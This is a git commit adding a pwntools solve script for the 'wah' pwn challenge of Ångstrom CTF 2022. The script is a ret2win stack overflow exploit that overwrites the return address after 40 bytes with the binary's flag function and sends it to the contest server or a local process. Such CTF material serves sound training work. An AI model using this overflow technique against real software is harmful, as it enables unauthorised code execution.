ef17c6f21a2e6f9488eb5dd4bc7865336461af66
GonTanaka <96073448+GonTanaka@users.noreply.github.com>
2022-05-05 12:40:51 +0100

    Add files via upload

--- angstrom2022/pwn/wah/solve.py
+++ angstrom2022/pwn/wah/solve.py
@@ -1,1 +1,29 @@
+#!/usr/bin/env python3
+#ret2win
 
+from pwn import *
+
+exe = ELF('wah')
+
+context.binary = exe
+context.log_level='debug'
+
+offset = 40
+
+def conn():
+    if args.REMOTE:
+        io = remote("challs.actf.co", 31224)
+    else:
+        io = process(exe.path)
+        if args.DEBUG:
+            gdb.attach(io)
+
+    return io
+
+payload = flat({
+    offset:[exe.functions.flag]
+    })
+
+io = conn()
+io.sendline(payload)
+io.interactive()
